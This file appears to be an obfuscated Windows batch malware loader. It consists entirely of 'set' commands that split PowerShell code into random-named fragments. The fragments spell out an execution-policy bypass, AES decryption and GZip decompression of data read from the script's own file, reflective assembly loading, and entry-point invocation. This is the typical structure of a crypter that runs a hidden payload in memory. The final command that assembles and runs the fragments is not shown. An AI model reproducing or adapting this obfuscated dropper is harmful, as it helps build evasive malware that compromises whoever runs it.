@echo off
set "oMITWfkvwI= C"
set "FZARRvWdRy= /"
set "ttbCZYBBbB=py"
set "tXMOhcElVM=s\"
set "ewbmHsEEOn=:\"
set "QZmoKowTsH=1."
set "taDrRRMYli=y "
set "JwFujHIPEU=ll"
set "zBEecoZYnW=he"
set "tlixYjGXso=Wi"
set "RRcLUFPQsc=em"
set "WxVbxSlHcZ=po"
set "RtRLxxPPKr=co"
set "CrSKKhcuJO=xe"
set "IGkAXbjJMi=ws"
set "lxaTUIkqnA=in"
set "CLnagJkrJU=we"
set "ouISqsekQR=he"
set "ePHtYMhqOh=\W"
set "zmchgCSBhB=Sy"
set "CBEzffKXOr=nd"
set "dHpwhKOrFS=0\"
set "kOxWQNqTOr=rs"
set "QaYvWcGDtQ=we"
set "NbjeaiFNEZ=do"
set "dORtfsuppx=ll"
set "zxIKHiaYkK=.e"
set "guMOzEnzWT=rS"
set "nutbmWrOVG=ow"
set "vGpWbdMnLm=\v"
set "xyckRdzihj=Po"
set "HHPwaZRgkb=st"
set "BzccSarlVK=32"
set "BnCWgLdBZy= %~dp0"
set "PeetBDoNMv=cd"
set "LXOOuEJecX=F'[-"
set "TDioPCyJfH=LJ ="
set "DaqEheoDzc=$iaS"
set "DppjBTBzhW=Syst"
set "ZEvniCWhpR=ypto"
set "nJfXjbxSnp=flec"
set "sVouDsIzKr=pose"
set "UGiUHxSWrj=oryS"
set "lbERAmRWdG=.Key"
set "KjsGVcwtWp=ress"
set "qYhvBleJSm=LJ);"
set "BBiiQwphLQ=lit("
set "EqYfQqHrmC=rofi"
set "iVjROFEjmj= = $"
set "KWpwiLpCCV=raph"
set "zkODtpjmnb=join"
set "UzBGqQONyh=form"
set "zyqzgZXdxp=nirt"
set "TOkfyuEDAb=mK);"
set "GGxxydfmmD=gnir"
set "ZVhCreESDq=tS46"
set "SVWFrQNXLI=bypa"
set "ypxDCdnvIW=grap"
set "GQkcaKeHNB=pres"
set "CXMYTAaJQH=em.C"
set "RenjPJGoQB=File"
set "SbcwFoAXmk=V = "
set "AiiscmBOjJ=brea"
set "PtDOAilUqi=Disp"
set "ORBGqcqRbA== $p"
set "CtTCKiJMbZ=t Sy"
set "BDUixCiLzB=HbL."
set "JmkVozTsxn=orF'"
set "JBIWNetpyq=J = "
set "PFulfdabPT= '')"
set "gxKyIxvtyE=yste"
set "rgLGJXPgCQ=and "
set "EonTKJGgUm=lz.I"
set "iEfqAiCctj=xRdk"
set "JrGcmcUSuy=e = "
set "GYAFSZTbab=ispo"
set "ztahmDIyRg=$xRd"
set "zFiVPHGOBg=DHzr"
set "WUKOWTtOea=ck($"
set "ZzsSuXJpJx=ring"
set "XSOtlDebLD=New-"
set "lKPMJwrMpH=embl"
set "zKDOhfCFqX=-nop"
set "eBQffhUsmG=ecry"
set "hbqrEmmPgR=m.Re"
set "dnBNQgDQNi=+hAO"
set "tFgusOchkc=ZYYc"
set "uNXtXCGMwZ=pFyl"
set "zbSvPRVpVR= '')"
set "rGUIomVDoY=3HWs"
set "bmBpoohxDP=$Mwp"
set "TKgRVeIUAO=tem."
set "AzZddRsErU=, (,"
set "JPLTRTWMYe=PKCS"
set "JaIoAussXK=ing("
set "KfsbXOjEyH=ode]"
set "gIzaCxSiek=e]::"
set "jxKdejKwWw=);$p"
set "viUyZZXoRI=ct S"
set "ppjDkaSUNa=  $h"
set "bhipiPYptm=.Com"
set "WUdbqsybBx=Fo7l"
set "NWduRWCWNL=join"
set "jurAsvlcVl=.Cry"
set "pcAIESCcdp=]::C"
set "znvAtNRdwD=r = "
set "bCQUAmeVsH=gMod"
set "lxLLcKKIHo='txe"
set "rvXKuOgner=Fina"
set "aGLHEKqlgk=n ''"
set "qMzXaeCezl=rity"
set "ivowKoOaXR=();$"
set "FOwGKbfaiN=rity"
set "OQPmLYPWkY=comm"
set "mUVcUkojHC=;$NK"
set "TIBXLbkzEL=[-1."
set "wwYVobWWhk=se()"
set "oMqgpbpuBM='gni"
set "TptKSbfKTt=kl ="
set "fOuQiiwMAR=fore"
set "GjUHnfrZZa=Fylz"
set "rAnXSpkODC=ect "
set "NNbffHyQcb=ionM"
set "UZZlWsBNuE=rtS4"
set "aeUEiMdzwX=[Sys"
set "nJeURjaRIl=tion"
set "qDSvmgXWhj=)) {"
set "BYGtNJntuR=$NKM"
set "xhDlmTpscq=ptog"
set "OQZCxdjJck=ddin"
set "HSWCOXdJDo=uRNL"
set "xlSBlKDojs=.Dis"
set "BpthgKrqvF=m.IO"
set "jZmKhbmjJT=L.Su"
set "nyjAmdGEdI=Fylz"
set "aGLorfuORy=mK.T"
set "OqqtTKVjYG=[Env"
set "qBPCLDKpKq=16] "
set "tkdPmaRTtl=d;$p"
set "rKFjTGFLLI=y.Cr"
set "cbpvTGWjan= [Sy"
set "dGMDxsIKCQ=6] -"
set "EkYWtzSzRl=-Obj"
set "ektdSajxIP=-joi"
set "bqpJAFoqur=Bmor"
set "mcseuQDUtj=-4] "
set "oLwEamywZr= [st"
set "GZwMmSKtoy=.Sec"
set "KxQlXvSkZm=z.Pa"
set "NhrcFNjdin=).Sp"
set "apohxotKsS=.Cry"
set "DTUHGbeGEn=] -j"
set "tmjqFNrSly= = $"
set "rXzxCmYReQ='')("
set "eMHfoyxebH=0O+g"
set "tradDqAnMG=1..-"
set "kOpFEMgmIN=('%~f0'"
set "XYxNFonMtY=stem"
set "rdtWrMwwVw=$uRN"
set "dIcrWspoeJ=oint"
set "NegzwaZyWS=yTo("
set "sFqDUiVzEE=m.IO"
set "vnhhPdfTYw=bstr"
set "XZLhxWFgAI=);$M"
set "BFYFQtaziD=3); "
set "raMVTgLXkP=.Con"
set "opCSMsfiKb=S46e"
set "GKCUkDVILc=eam("
set "tUvuRvFvJf=IN.T"
set "fNpGFaggJf=)))"
set "JYNRpBQfKz=m.En"
set "yYFtXAEJqf=lBlo"
set "xZARZwQYiU=]::N"
set "MyrJiWjIdl=ne);"
set "vjHIZGreKe=iaSP"
set "vYMCTWtmTG=hy.A"
set "KNbChVmFgp=('%*'"
set "fZFqAdPLfS=.Mod"
set "ayFVIXfYbe=[IO."
set "BmkZZMbATY=wpmK"
set "lgrsyIszMb=Star"
set "YWDKvTDZAN=TllA"
set "ITWCIcaZXJ=ose("
set "pDixMINmhU=Fylz"
set "HJUSjOPjYo===')"
set "NyOclboQQZ=ct S"
set "zEcwEuPKeg=l) {"
set "qqfdfcMaNI=.IO."
set "ZZeeFRJejy=[Sys"
set "bzmFEyNiwv= if "
set "EaNtSZIPuI=mK ="
set "tqWidbzhPN=J = "
set "jLEVxCfgLb=g = "
set "YXGBCKOwkp=..-1"
set "ZZZbSsynWP=RNLJ"
set "XmCPVPcZnF=ptog"
set "CFtIeDTslv=oL'["
set "DcHlGhZQHo=..-1"
set "ObvQqCweiQ=saBm"
set "ZCXvshVlBA=::('"
set "uymzEfPMso=sion"
set "JUlZrPoCrv=; };"
set "dGKuVARqlo=$uRN"
set "LdPZpFYOuP=MIN "
set "FAMcklBvZK=pose"
set "xUgbEyGsGZ=.Len"
set "aDXAIjcUpT=;$ic"
set "XRiqwvQIZi=stem"
set "XSmhXpUOvz=mory"
set "AJWYMbRfLj=wwHb"
set "pNvmiomFBN=onve"
set "QhNsGObMtq=tryP"
set "qbIVkcUZKl=:: '"
set "erzlrNJhpl=oArr"
set "GJkgBEkpXE=null"
set "LvZvYusRGu=;$NK"
set "DnKpsCunwv=yste"
set "vKSnAHYntJ=v4Ir"
set "mQGdEDSdRy=[Sys"
set "YOWfeOLJVg=Obje"
set "BhGuSRWpIc=pDZz"
set "UttLTiXWkC=Byyz"
set "NXAbDztTYO=Obje"
set "gjYiqlxsSy=O.Me"
set "gdEWFJPiXb=);$p"
set "rknxFxFdic=th('"
set "YEWKSfXSlx=comp"
set "YFvTlGuxet=UGTu"
set "iKoJEzHReK=Fylz"
set "EIpYqVfvIA=]::("
set "XYlduJLOEY=6esa"
set "lSCvvPEkKH=iccG"
set "zXWKTdvudn='[-1"
set "yEmIttcRas=em.I"
set "miVXPdGosX=HbL "
set "lugVtASSYa=('da"
set "RaeBfDXJUx=ewLi"
set "tatXdHMsJG=rans"
set "MVGfgGdEez=OyzA"
set "GrgFjchdnx=]::("
set "ZmXeDYXYvE=$icc"
set "kRwknjwYTh=New-"
set "mYIGzRXnQr=esMa"
set "GKqrITgpRg=zrm "
set "RIXcjNYKgV=ss -"
set "IRdUsFYrkJ=raph"
set "OzyMtrSQob=Gat."
set "ZmfoNBvDrr=gth)"
set "ilsjUIcEwH=($ww"
set "QGyqxNDWYV=[]] "
set "zNKxigzxep=oin "
set "gJLqPEQeMI=Pr.D"
set "ivcVdgiIiR=aSPr"
set "urjeKFbdFZ=RNLJ"
set "UQCJsrZvOM=MIN."
set "QaPizUTsfV=ateD"
set "gOllLJTRjY=m(, "
set "bQMMqLXqsm= [Sy"
set "SnCbkUHIVA=-1.."
set "BFArTgKzSy=7;$p"
set "kGAjUSVzoP=$Mwp"
set "ApfDKuwrhm=yste"
set "MWUSRbSOXH=Conv"
set "aDfiryWvzu=y]::"
set "EcdWzylBxu=7Yiv"
set "EDkeCYSfKy=n ''"
set "yiCAIJGmke=1] -"
set "uvXVKtFNpi=tem."
set "cbLMvihlid=trea"
set "JkDhVIRoBw=);$e"
set "qsXofAhhhv= = ["
set "knCxGJLQbO=Disp"
set "IRhIpIFgOi=ment"
set "RrtaXNvdvM=.Cop"
set "rExJsbrpBp=vert"
set "VJMqwttBgf='[-1"
set "DfTkPLfqhw=pStr"
set "DzOoevkxeO=-joi"
set "WDUrmALRkK=isfL"
set "fxNGPZTVOv=Secu"
set "PHVgNMFIRY=;$DH"
set "YuSzswenVP=.Dis"
set "XCgPKuZXes=ay()"
set "wrjbwbmcGQ=nage"
set "lgOBBRdlwC=Secu"
set "KWlrwYIRJd=($ww"
set "xOACZlESEV=tem."
set "SkWxOAmpnn=)($u"
set "azgYlLgkVN=uRNL"
set "yPXUFkJgMU=();$"
set "RMHzJitVLM=ptor"
set "SYuRUGmaOv= = N"
set "BynsiWThIP=J, 0"
set "joiKDdOjOI=sGUc"
set "vZnaDwkTzP=bjec"
set "MtbDdawHiq=ew-O"
set "ERkUeguWiY=$Mwp"
set "IHSmHveugC=.GZi"
set "UyGGPkZyzJ=esaB"
set "OCRyBYkzUd=daeR"
set "fFxGVDTVCE=.Cre"
set "EzQSuFAKMh=cGz."
set "UiiePcxjYP=ddin"
set "ebEOakhlcQ=)($h"
set "JAttLLfnou=y.Pa"
set "mCabNcssxw=ke($"
set "CLIUkINFCM=ach "
set "hlidVaQwzA=in $"
set "wsjUJZNUrK='dqR"
set "iXEznsKQPc=iron"
set "qNrrdsFZvF=:('g"
set "OgVCQWkrWV=ress"
set "uuFYbnmTCV=tsWi"
set "hOuUeUDcfL=ress"
set "oEEBiWRGdn=y.Ci"
